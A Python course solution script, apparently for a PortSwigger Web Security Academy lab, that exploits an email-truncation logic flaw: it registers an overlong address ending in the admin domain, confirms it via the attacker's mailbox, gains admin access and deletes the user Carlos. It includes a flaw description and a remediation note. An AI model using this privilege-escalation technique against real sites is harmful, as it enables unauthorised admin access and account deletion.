"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Inconsistent handling of exceptional input

Level Description:
    This lab doesn't adequately validate user input. 
    You can exploit a logic flaw in its account registration process to 
    gain access to administrative functionality. To solve the lab, access 
    the admin panel and delete Carlos. 

Vulnerability Description:
    The vulnerability of this level is that the site mishandles client supplied input. Specifically,
    when registering an email address the site will cut off characters if an email address is "too long".
    You can exploit this by creating a very long string, appending on the admin email address of
    "@dontwannacry.com" to the end of this string and then appending ".<email client email address>"
    to the end of that. When registering the user's account, the site will forward the registration email
    to the email client email address, but will cut off the email client email address on the website.
    This will cause the site to believe you have an admin email address of "<very long string>@dontwannacry.com".
    Since the site believes you have an admin email address, you get admin access so now you can go to 
    the admin panel and delete Carlos' profile to solve the level.

Remediation:
    An easy fix would be for the developers to not cut off email addresses the 255 character point. The
    site would still forward the request to the email client email address, but it would see you as a 
    "@dontwannacry.com.<custom_url>.web-security-academy.net" and not just as a "@dontwannacry.com" email
    address.
"""

"""
    We need to import "requests" so we can send POST and GET requests.
    We need "BeautifulSoup" to extract CSRF tokens for forms. We will
    also need it to get the email client link.
"""
import requests
from bs4 import BeautifulSoup

s = requests.Session()
username = 'aaaa'
password = 'aaaa'
site = "ac491fc81ea5055680e91eab006d00e6.web-security-academy.net"
login_url = f"https://{site}/login"

"""
    Below I am getting the main site page and then using BeautifulSoup
    to extract the link to the email client page.
"""
resp = s.get(f"https://{site}")
soup = BeautifulSoup(resp.text,'html.parser')
email_client = soup.find('a', {'id':'exploit-link'}).get('href')
print(f"email client link: {email_client}")

"""
    Once we have the email client link, we will send a GET request for the email client page
    in order to extract the email address we will need for later in the level.
"""
resp = s.get(email_client)
soup = BeautifulSoup(resp.text,'html.parser')
email_address = soup.find('h4').text
email_address = email_address.replace("Your email address is attacker@", "")
print(f"Email address: {email_address}")

"""
    Below, we are sending a GET request for the registration page. 
    We will then use BeautifulSoup to extract the csrf token for the registration form.
"""
register_url = f"https://{site}/register"
resp = s.get(register_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

"""
    Here I am creating a very long string which will exploit the flaw in the site. The "m" in
    ".com" at the end of the string is the last character which the site will accept.
"""
very_long_string = "1111111111222222222233333333334444444444555555555566666666667777777777888888888899999999990000000000111111111122222222223333333333444444444455555555556666666666777777777788888888889999999999000000000011111111112222222222333333333344444444@dontwannacry.com."

"""
    I package up the csrf token, the arbitrary username and password, and then I append the very
    long string to the email address found in the email client. This very long email will successfully
    be registered and will forward the verification email to the email client I control. The site will
    only log up to the ".com" part and will think I am an admin user.
"""
register_data = {
    "csrf" : csrf,
    'username' : username,
    'email' : f'{very_long_string}{email_address}',
    'password' : password
}

resp = s.post(register_url, data=register_data)
print(f"Initial Register Response: {resp.status_code}")

# go to email client and click link to confirm email address
resp = s.get(email_client)
soup = BeautifulSoup(resp.text,'html.parser')
confirm_email_link = soup.find('pre').text
confirm_email_link = confirm_email_link.replace("Hello!", "")
confirm_email_link = confirm_email_link.replace("Please follow the link below to confirm your email and complete registration.", "")
confirm_email_link = confirm_email_link.replace("Thanks,", "")
confirm_email_link = confirm_email_link.replace("Support team", "")
confirm_email_link = confirm_email_link.strip()

resp = s.get(confirm_email_link)
print(f"confirm email link status: {resp.status_code}")


# get login page csrf
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username': username,
    'password': password
}

# login with csrf and now-valid admin credentials
resp = s.post(login_url, data=login_data)
print(f"Login status {resp.status_code}")

# once logged in, go to admin page
resp = s.get(f"https://{site}/admin")
print(f"Get admin page status: {resp.status_code}")

# delete carlos' profile, win.
soup = BeautifulSoup(resp.text, 'html.parser')
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
delete_uri = carlos_delete_link[0]['href']
resp = s.get(f"https://{site}{delete_uri}")
print(f"Delete carlos status: {resp.status_code}")
